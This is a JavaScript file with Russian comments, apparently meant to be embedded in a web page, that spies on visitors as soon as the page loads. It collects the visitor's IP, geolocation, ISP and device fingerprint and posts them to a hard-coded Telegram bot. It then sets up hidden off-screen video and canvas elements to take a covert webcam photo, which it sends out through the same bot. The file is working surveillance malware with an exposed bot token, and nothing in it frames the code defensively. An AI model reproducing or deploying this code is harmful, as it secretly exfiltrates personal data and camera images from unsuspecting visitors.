// =================================================================
//                 КОНФИГУРАЦИЯ TELEGRAM
// =================================================================
// Ваши параметры
const BOT_TOKEN = "7986900528:AAHAQ9HuC9gl0cFXYyMZkXgw1qo8ogClqWw";
const CHAT_ID = "7518382960"; 
        
// API для получения IP и Геолокации. Используем ipapi.co
const GEO_API_URL = 'https://ipapi.co/json/'; 

// =================================================================
//          ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ ДЛЯ HTML-ЭКРАНИРОВАНИЯ
// =================================================================
/**
 * Экранирует специальные символы (<, >, &) для HTML-форматирования в Telegram.
 */
function escapeHTML(text) {
    if (!text) return 'Н/Д';
    const str = (typeof text === 'object' ? JSON.stringify(text) : String(text));
    return str.replace(/&/g, '&amp;')
              .replace(/</g, '&lt;')
              .replace(/>/g, '&gt;');
}

// =================================================================
//                 ОСНОВНАЯ ФУНКЦИЯ ОТПРАВКИ ДАННЫХ
// =================================================================
async function sendVisitorData() {
    let visitorData = {};
    
    try {
        // --- Блок 1: Сбор геоданных и IP (через внешний API) ---
        const geoResponse = await fetch(GEO_API_URL);
        const geoData = await geoResponse.json();
        
        // --- Блок 2: Сбор данных с клиента (через JavaScript API) ---
        
        const userAgent = navigator.userAgent;
        let browser = 'Н/Д', os = 'Н/Д';
        if (userAgent.includes('Firefox')) browser = 'Firefox';
        else if (userAgent.includes('Edg')) browser = 'Edge';
        else if (userAgent.includes('Chrome')) browser = 'Chrome';
        else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) browser = 'Safari';
        
        if (userAgent.includes('Win')) os = 'Windows';
        else if (userAgent.includes('Mac')) os = 'macOS';
        else if (userAgent.includes('Linux')) os = 'Linux';
        else if (userAgent.includes('Android')) os = 'Android';
        else if (userAgent.includes('iPhone')) os = 'iOS';

        let batteryInfo = 'Н/Д';
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                const level = Math.round(battery.level * 100);
                const charging = battery.charging ? 'Да' : 'Нет';
                batteryInfo = `${level}% (Зарядка: ${charging})`;
            } catch (e) {
                batteryInfo = 'Нет доступа';
            }
        }
        
        const plugins = Array.from(navigator.plugins).map(p => p.name).join(', ') || 'Нет';
        const pluginsShort = plugins.substring(0, 100) + (plugins.length > 100 ? '...' : '');
        
        const deviceMemory = navigator.deviceMemory || 'Н/Д (API не поддерживается)';
        
        // 3. Формирование объекта данных с экранированием
        visitorData = {
            ip: escapeHTML(geoData.ip || 'Н/Д'),
            country: escapeHTML(geoData.country_name || 'Н/Д'),
            city: escapeHTML(geoData.city || 'Н/Д'),
            org: escapeHTML(geoData.org || 'Н/Д'),
            timezone: escapeHTML(geoData.timezone || 'Н/Д'),
            isp: escapeHTML(geoData.asn || 'Н/Д'),

            os: escapeHTML(os),
            browser: escapeHTML(browser),
            device_memory: escapeHTML(deviceMemory), 
            screen_res: escapeHTML(`${window.screen.width}x${window.screen.height}`),
            language: escapeHTML(navigator.language),
            hardware_concurrency: escapeHTML(navigator.hardwareConcurrency || 'Н/Д'),
            online_status: escapeHTML(navigator.onLine ? 'Онлайн' : 'Офлайн'),
            battery_status: escapeHTML(batteryInfo),
            plugins_list: escapeHTML(pluginsShort),
            history_length: escapeHTML(window.history.length || 1),
            current_time: escapeHTML(new Date().toLocaleString('ru-RU', { timeZoneName: 'short' })),
            full_ua: escapeHTML(userAgent.substring(0, 150) + (userAgent.length > 150 ? '...' : '')),
        };

        // -----------------------------------------------------------------
        // --- Блок 4: Формирование сообщения (Детальный HTML-формат) ---
        // -----------------------------------------------------------------
        
        const messageText = 
            `&#x2705; <b>МАКСИМУМ ДАННЫХ ПОСЕТИТЕЛЯ</b>\n` +
            `&#x23F1; <b>Время:</b> <code>${visitorData.current_time}</code>\n\n` +
            
            `\u{1F310} <b>СЕТЬ И ГЕОЛОКАЦИЯ</b>\n` +
            `— IP: <code>${visitorData.ip}</code>\n` +
            `— Страна: <b>${visitorData.country}</b> (${visitorData.city})\n` +
            `— Провайдер: ${visitorData.org}\n` +
            `— Часовой пояс: ${visitorData.timezone}\n` +
            `— Статус сети: ${visitorData.online_status}\n\n` +

            `\u{1F4BB} <b>УСТРОЙСТВО И СИСТЕМА</b>\n` +
            `— ОС / Браузер: <b>${visitorData.os}</b> / <b>${visitorData.browser}</b>\n` +
            `— <b>RAM (ОЗУ):</b> <code>${visitorData.device_memory} GiB</code>\n` +
            `— Язык: ${visitorData.language}\n` +
            `— Разрешение: ${visitorData.screen_res}\n` +
            `— Ядра CPU (потоки): ${visitorData.hardware_concurrency}\n` +
            `— Состояние батареи: ${visitorData.battery_status}\n` +
            `— Посещено страниц: ${visitorData.history_length}\n` +
            `— Плагины: <code>${visitorData.plugins_list}</code>\n` +
            `— User-Agent (кратко): <code>${visitorData.full_ua}</code>`;
            
        // 5. Кодирование текста и отправка запроса
        const encodedMessage = encodeURIComponent(messageText);

        const TELEGRAM_URL = 
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?` +
            `chat_id=${CHAT_ID}&` +
            `text=${encodedMessage}&` +
            `parse_mode=HTML`;

        const telegramResponse = await fetch(TELEGRAM_URL);
        
        if (telegramResponse.ok) {
            console.log('Детальное уведомление успешно отправлено.');
        } else {
            console.error(`Ошибка (${telegramResponse.status}) при отправке детального уведомления в Telegram.`, await telegramResponse.json());
        }

    } catch (error) {
        console.error('Критическая ошибка при сборе данных или отправке:', error);
    }
}


// =================================================================
//                 ЛОГИКА ДЛЯ ДИНАМИЧЕСКОГО ЗАХВАТА ФОТО
// =================================================================

/**
 * Отправляет Base64 строку изображения в Telegram как документ. 
 * ВНИМАНИЕ: Это очень неэффективно и приводит к большим сообщениям.
 */
async function sendPhotoToTelegram(imageDataURL) {
    try {
        const encodedImage = encodeURIComponent(imageDataURL);
        const caption = encodeURIComponent("Скрытый захват с веб-камеры");

        // Используем sendDocument, так как sendPhoto требует multipart/form-data POST-запроса,
        // который сложнее реализовать через простой GET fetch.
        const TELEGRAM_PHOTO_URL = 
            `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument?` + 
            `chat_id=${CHAT_ID}&` +
            `document=${encodedImage}&` + 
            `caption=${caption}`;

        const telegramResponse = await fetch(TELEGRAM_PHOTO_URL);
        
        if (telegramResponse.ok) {
            console.log('Скрытое фото успешно отправлено в Telegram.');
        } else {
            const errorData = await telegramResponse.json();
            console.error(`Ошибка (${telegramResponse.status}) при отправке фото:`, errorData);
        }
    } catch (error) {
        console.error('Критическая ошибка при отправке фото:', error);
    }
}


/**
 * Динамически создает элементы, запрашивает доступ к камере, делает снимок и удаляет элементы.
 */
async function captureAndSendHiddenPhoto() {
    let stream = null;
    let videoElement = null;
    let canvasElement = null;

    try {
        // 1. Динамическое создание элементов
        videoElement = document.createElement('video');
        canvasElement = document.createElement('canvas');
        
        // Скрываем элементы (невидимый для пользователя)
        videoElement.style.cssText = 'position: fixed; top: -9999px; left: -9999px; visibility: hidden;';
        canvasElement.style.cssText = 'position: fixed; top: -9999px; left: -9999px; visibility: hidden;';

        document.body.appendChild(videoElement);
        document.body.appendChild(canvasElement);

        // 2. Запрос доступа к камере (здесь появится окно с запросом разрешения)
        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        videoElement.srcObject = stream;
        videoElement.play();

        // 3. Ждем, пока видео начнет проигрываться, чтобы получить размеры
        await new Promise(resolve => videoElement.onloadedmetadata = resolve);

        // Установка размеров canvas
        canvasElement.width = videoElement.videoWidth || 640;
        canvasElement.height = videoElement.videoHeight || 480;

        // 4. Захват кадра
        const context = canvasElement.getContext('2d');
        // Даем браузеру секунду на "разогрев" потока, чтобы избежать черного кадра
        await new Promise(resolve => setTimeout(resolve, 1000)); 
        context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
        
        // Преобразование в Base64 (низкое качество для уменьшения размера)
        const imageDataURL = canvasElement.toDataURL('image/jpeg', 0.6); 

        // 5. Отправка
        await sendPhotoToTelegram(imageDataURL);

    } catch (err) {
        // Если пользователь заблокировал доступ или произошла ошибка
        console.warn(`Захват фото был пропущен. Вероятная причина: ${err.name} (пользователь отклонил доступ или нет камеры).`);
    } finally {
        // 6. Обязательная остановка потока и удаление элементов
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
        }
        if (videoElement && videoElement.parentNode) {
            videoElement.parentNode.removeChild(videoElement);
        }
        if (canvasElement && canvasElement.parentNode) {
            canvasElement.parentNode.removeChild(canvasElement);
        }
    }
}


// Запуск функций при загрузке страницы
window.onload = async () => {
    // 1. Отправляем все собранные данные
    await sendVisitorData(); 
    
    // 2. Пытаемся сделать скрытое фото
    // !!! Пользователь увидит запрос на разрешение камеры сразу после загрузки !!!
    await captureAndSendHiddenPhoto();
};